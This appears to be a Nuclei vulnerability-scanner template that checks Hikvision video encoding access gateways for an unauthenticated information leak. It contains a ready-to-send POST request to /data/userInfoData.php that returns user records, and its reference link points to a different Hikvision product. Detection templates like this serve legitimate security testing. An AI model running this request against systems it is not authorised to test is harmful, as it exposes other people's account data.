id: hikvision-userinfodata-info-disclosure

info:
  name: HIKVISION 视频编码设备接入网关 userinfodata - Info Disclosure
  author: qwtd
  severity: medium
  description: |
    HIKVISION 视频编码设备接入网关 userinfodata 信息泄露漏洞，该漏洞源于用户信息数据获取接口存在信息泄露漏洞，攻击者可利用该漏洞获取用户信息。
  reference:
    - https://github.com/eeeeeeeeee-code/POC/blob/87a48191f2c0e2c9a3b71072cebd3297326fee50/wpoc/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86iVMS%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%B3%BB%E7%BB%9F/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0getAllUserInfo%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md?plain=1#L21
  tags: HIKVISION-视频编码设备接入网关

http:
  - raw:
      - |
        POST /data/userInfoData.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest
        Content-Length: 36
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Te: trailers
        Connection: keep-alive

        page=1&rows=20&sort=userId&order=asc

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'total'
          - 'rows'
          - 'userId'
        condition: and
      - type: status
        status:
          - 200
